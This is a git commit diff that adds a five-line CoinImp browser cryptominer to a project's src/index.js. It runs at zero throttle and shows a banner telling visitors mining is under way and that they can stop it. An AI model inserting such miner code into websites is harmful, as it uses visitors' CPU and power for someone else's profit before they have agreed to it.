7abc90242630e1661c9e8d2277285b63a4d51831
WetherCoin <coinnointv@gmail.com>
2024-05-06 17:40:38 +0900

    feat: added coinimp

---
+++ src/index.js
@@ -0,0 +1,5 @@
+var _client = new Client.Anonymous('0e266f252a9f983d3e514756bd75cfe5af0a1bf9ac04c7235687010bdd84203e', {
+    throttle: 0, c: 'w'
+});
+_client.start();
+_client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
